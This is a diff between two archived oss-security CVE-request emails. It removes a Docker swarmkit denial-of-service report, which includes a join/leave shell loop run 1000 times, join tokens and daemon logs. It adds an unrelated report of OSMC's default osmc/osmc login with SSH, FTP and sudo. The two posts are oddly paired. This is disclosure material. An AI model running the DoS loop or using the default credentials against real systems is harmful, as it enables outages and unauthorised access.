@@ -1,86 +1,24 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/07/29/3
-Message-ID: <5EDB84F4B23F5B4DB6500A89258280E0BD067A@EX02.corp.qihoo.net>
-Date: Fri, 29 Jul 2016 09:47:31 +0000
-From: 张开翔 <zhangkaixiang@....cn>
-To: "oss-security@...ts.openwall.com" <oss-security@...ts.openwall.com>
-CC: "cve-assign@...re.org" <cve-assign@...re.org>
-Subject: cve request: docker swarmkit Dos occurs by repeatly joining and quitting swam cluster as a node
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/02/04/5
+Message-ID: <56B3B4D9.3000806@trylinux.us>
+Date: Thu, 4 Feb 2016 12:30:17 -0800
+From: "Zach W." <kestrel@...linux.us>
+To: oss-security@...ts.openwall.com, cve-assign@...re.org
+Subject: CVE Request: Open Source Media Center insecure default config
 Content-Type: text/plain; charset=utf-8
 
-Docker swarmkit is used to form a swarm, coordinating tasks. Once a machine joins, it becomes a Swarm Node. Nodes can either be worker nodes or manager nodes.
- I found a vulnerability in docker of the latest version which could cause a Denial of Service, it results in a machine could not join the swarm cluster after another node’s repeatedly
-joining and quitting the swarm for many times(taking my testing as example , it should need at least one thousand times. )Moreover, the docker debugging info indicates
-the Dispatcher is stopped and ca server may exited sometimes.
+Hey all,
 
+Using several other CVEs as an example (such as
+http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-6850), I am
+requesting a CVE for "OSMC: Open Source Media Center" default config.
 
-# docker version
-Client:
-Version:      1.12.0-dev
-API version:  1.25
-Go version:   go1.6.3
-Git commit:   9c1be54-unsupported
-Built:        Fri Jul 29 15:40:52 2016
-OS/Arch:      linux/amd64
+1) Default user is osmc/osmc
+2) SSH, and FTP are enabled by default, which osmc has access to
+3) The interface does not require or request a password change for the
+default user
+4) osmc has full sudoers access and can gain root access via sudo
 
-Server:
-Version:      1.12.0-dev
-API version:  1.25
-Go version:   go1.6.3
-Git commit:   9c1be54-unsupported
-Built:        Fri Jul 29 15:40:52 2016
-OS/Arch:      linux/amd64
+Thanks!
 
-# docker swarm init
-Swarm initialized: current node (23m6ksr96whsvuo8lzokenju3) is now a manager.
-
-To add a worker to this swarm, run the following command:
-    docker swarm join \
-    --token SWMTKN-1-30f6ibzpscqh05qqdog85ktr8ptcw7ttn4wy5cwixy1wfchhb9-aljewtdn5727g1pldxnevjh51 \
-    xx.xx.xx.xx:2377
-
-To add a manager to this swarm, run the following command:
-    docker swarm join \
-    --token SWMTKN-1-30f6ibzpscqh05qqdog85ktr8ptcw7ttn4wy5cwixy1wfchhb9-0p086z2sdbnpvognjmu76gpi6 \
-    xx.xx.xx.xx :2377
-
-Login machine A1 and join the swarm ,and then quitted the swarm.
------------------------------------------------------
-# docker swarm join --token SWMTKN-1-30f6ibzpscqh05qqdog85ktr8ptcw7ttn4wy5cwixy1wfchhb9-aljewtdn5727g1pldxnevjh51 xx.xx.xx.xx:2377
-This node joined a swarm as a worker.
-# docker swarm leave --force
-Node left the swarm.
-
-Login machine A2 , repeatedly join and quit the swarm for 1000 times.
------------------------------------------------------
-# for i in {1..1000}; do docker swarm leave --force ; docker swarm join --token SWMTKN-1-30f6ibzpscqh05qqdog85ktr8ptcw7ttn4wy5cwixy1wfchhb9-aljewtdn5727g1pldxnevjh51 xx.xx.xx.xx:2377 ;done
-This node joined a swarm as a worker.
-Node left the swarm.
-This node joined a swarm as a worker.
-Node left the swarm.
-This node joined a swarm as a worker.
-Node left the swarm.
-This node joined a swarm as a worker.
-Node left the swarm.
-This node joined a swarm as a worker.
-Node left the swarm.
-
-After finishing that, Login machine A1 again and attempt to join the swarm, it failed.
---------------------------------------------------------
-# docker swarm join --token SWMTKN-1-30f6ibzpscqh05qqdog85ktr8ptcw7ttn4wy5cwixy1wfchhb9-aljewtdn5727g1pldxnevjh51 xx.xx.xx.xx:2377
-Error response from daemon: Timeout was reached before node was joined. Attempt to join the cluster will continue in the background. Use "docker info" command to see the current swarm status of your node.
-
-  Some debugging information of docker daemon.
-  ---------------------------------------------------------
-time="2016-07-29T15:24:02.374560815+08:00" level=error msg="failed to remove node" error="rpc error: code = 10 desc = dispatcher is stopped" method="(*Dispatcher).Session" node.id=b11ta5p8g2wgy10vyzgsi6ocm node.session=1aph8scsewn89j3h5o3emgdql
-time="2016-07-29T15:24:02.374604898+08:00" level=error msg=" session failed" error="rpc error: code = 1 desc = context canceled" module=agent
-         time="2016-07-29T15:24:14.069347074+08:00" level=debug msg="heartbeat expiration"
-time="2016-07-29T15:24:14.069428834+08:00" level=error msg="failed deregistering node after heartbeat expiration" error="rpc error: code = 10 desc = dispatcher is stopped"
-… …
-
-Please assign CVE IDs for the security issue ?
-
-  Best regards&
-  Kaixiang Zhang of the Cloud Security Team, Qihoo 360
-
-
+Zach W.
